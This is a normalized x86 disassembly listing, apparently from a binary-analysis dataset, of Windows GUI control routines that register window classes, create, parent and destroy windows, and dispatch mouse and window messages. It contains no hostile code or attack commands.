retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43ffa0
xor edx edx
push ebp
push sub_44018b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_440438
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413de8
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_413f44
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403258
mov eax [ ebp - 0x4 ]
call sub_43ffa8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4403fc
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43c434
mov dl 0x4
call sub_43c434
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413e34
sub_4401f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_453eac
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_457bd0
sub_440218
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43b814
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43b814
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43b814
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_440264
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43b83c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43b83c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43b83c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_4402ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403454
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43e0d4
mov edx ebx
mov eax edi
call sub_440218
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43e0d4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e0d4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax edi
call sub_443a0c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43e0d4
mov eax edi
call sub_440dfc
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43ff0c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440380
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43e0d4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax esi
call sub_443a0c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_4401f8
mov eax ebp
call sub_440c60
jmp r-xdata
mov edx ebx
mov eax esi
call sub_440264
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43e0d4
mov eax esi
call sub_43ffc8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d368
sub_4403fc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_413f44
mov edx edi
mov eax ebp
call sub_413f44
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_440458
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_440438
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4403fc
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_440498
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_440458
add esp 0x10
retn
sub_4404c0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44052c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43d564
test al al
je r-xdata
mov eax ebx
call sub_43d594
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403454
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403454
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_440594
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4406b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402c64
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44052c
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_443708
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40420c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408774
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4406b9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_4406c0
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_440881
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_439cc0
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_439cc0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40ccf4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40ccf4
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408928
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_443a18
push 0x1
mov eax [ esi + 0x68 ]
call sub_41ce2c
mov ecx eax
mov edx 0x30
mov eax esi
call sub_43e0d4
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_443708
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440888
lea eax [ ebp - 0xc0 ]
call sub_403fa8
retn
mov eax esi
mov si 0xffee
call sub_403454
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_440890
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406a40
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_4408d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417ebc
mov eax esi
call sub_417e0c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417e0c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417ec4
pop esi
pop ebx
retn
sub_440908
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_419708
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419694
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419694
mov eax esi
call sub_419710
add esp 0x10
pop esi
pop ebx
retn
sub_440970
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44095c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_413f44
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413f44
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_440a48
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43e40c
mov eax [ ebp - 0x8 ]
push eax
push sub_4408d0
mov eax [ ebp - 0x8 ]
push eax
push sub_440908
push ebp
call sub_440970
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440aa4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43ce94
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4088dc
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4088f0
mov ecx eax
mov edx edi
mov eax ebx
call sub_43cea4
mov eax r-xdata
call sub_4088fc
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_43b948
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_440afc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_440b49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b50
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40ccf4
sub_440b60
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413fa0
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_413f44
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_440ba8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_440438
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_440b60
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_4403fc
call sub_43c574
inc edi
dec esi
jne r-xdata
sub_440c44
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_440c60
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_413f44
call sub_440c60
inc edi
dec esi
jne r-xdata
sub_440cc0
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403454
mov ebx eax
mov eax edi
call sub_440c60
mov eax edi
call sub_440dfc
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_440d00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_440dd6
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_43e0d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_413f44
call sub_440d00
inc esi
dec ebx
jne r-xdata
sub_440dfc
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440d00
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_440e3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_440c60
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_440dfc
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406a28
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e0d4
jmp r-xdata
sub_440ec4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036f8#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_440f0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f12
call sub_43b948
call sub_4210e8
retn
sub_440f3c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_412ae8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406a10
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_43e0d4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_440ff4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_413f44
call sub_440f3c
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_413f44
call sub_440f3c
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_441088
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_443708
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_440ff4
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a10
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_43e0d4
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44111c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_43d690
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_43e1a0
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_441088
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_4069fc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_43ca64
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_440ff4
test eax eax
je r-xdata
mov eax ebx
call sub_453eac
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_43e1a0
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_443708
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_443708
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_43e0d4
sub_441280
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_43e334
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_43e0d4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
